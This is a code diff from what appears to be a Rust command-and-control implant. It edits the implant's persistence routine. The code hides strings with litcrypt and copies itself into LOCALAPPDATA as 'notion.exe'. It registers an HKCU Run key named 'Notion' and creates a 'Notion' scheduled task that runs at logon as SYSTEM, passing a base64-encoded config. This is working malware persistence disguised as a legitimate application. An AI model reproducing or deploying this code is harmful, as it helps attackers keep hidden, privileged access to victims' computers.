@@ -1,11 +1,12 @@
 use litcrypt::lc;
 use std::error::Error;
 use std::env::{var, args};
-use is_root::is_root;
-use crate::cmd::{CommandArgs, shell, save, command_out};
+#[cfg(not(windows))] use is_root::is_root;
+#[cfg(not(windows))] use crate::cmd::{CommandArgs, shell, save, command_out};
+#[cfg(windows)] use crate::cmd::{CommandArgs, command_out};
 #[cfg(not(windows))] use std::fs::{create_dir, copy, write};
 #[cfg(windows)] use std::path::Path;
-#[cfg(windows)] use winreg::{RegKey};
+#[cfg(windows)] use winreg::{RegKey, enums::*};
 #[cfg(windows)] use std::fs::copy as fs_copy;
 #[cfg(windows)] use winreg::enums::HKEY_CURRENT_USER;
 #[cfg(windows)] use std::process::Command;
@@ -58,8 +59,8 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                     let path = Path::new(r"Software\Microsoft\Windows\CurrentVersion\Run");
                     let (key, disp) = hkcu.create_subkey(&path)?;
                     match disp {
-                        REG_CREATED_NEW_KEY => logger.info(log_out!("A new key has been created")),
-                        REG_OPENED_EXISTING_KEY => logger.info(log_out!("An existing key has been opened")),
+                        RegDisposition::REG_CREATED_NEW_KEY => logger.info(log_out!("A new key has been created")),
+                        RegDisposition::REG_OPENED_EXISTING_KEY => logger.info(log_out!("An existing key has been opened")),
                     };
                     key.set_value("Notion", &persist_path)?;
                     command_out!("Persistence accomplished")
@@ -127,9 +128,9 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                 let elevated = is_elevated();
                 if elevated {
                     if let Ok(v) = var("LOCALAPPDATA") {
-                        let cfg_path = format!("{v}\\cfg.json");
-                        let mut cfg_path_args = CommandArgs::from_string(cfg_path.to_owned());
-                        save::handle(&mut cfg_path_args, config_options).await?;
+                        // let cfg_path = format!("{v}\\cfg.json");
+                        // let mut cfg_path_args = CommandArgs::from_string(cfg_path.to_owned());
+                        // save::handle(&mut cfg_path_args, config_options).await?;
                         let mut persist_path: String = v;
                         persist_path.push_str(r"\notion.exe");
                         
@@ -138,13 +139,13 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                             Ok(_)  => {
                                 
                                 let encoded_config = config_options.to_base64();
-                                let schtask_arg = format!(r#" /create /tn Notion /tr "C:\Windows\System32\cmd.exe '{persist_path} -c {cfg_path}'" /sc onlogon /ru System""#);
+                                // let schtask_arg = format!(r#" /create /tn Notion /tr "C:\Windows\System32\cmd.exe '{persist_path} -b {encoded_config}'" /sc onlogon /ru System""#);
                                 let output = Command::new("schtasks.exe")
                                     .arg("/create")
                                     .arg("/tn")
                                     .arg("Notion")
                                     .arg("/tr")
-                                    .arg(format!(r#"{persist_path} -c {cfg_path}"#))
+                                    .arg(format!(r#"{persist_path} -b {encoded_config}"#))
                                     .arg("/sc")
                                     .arg("onlogon")
                                     .arg("/ru")
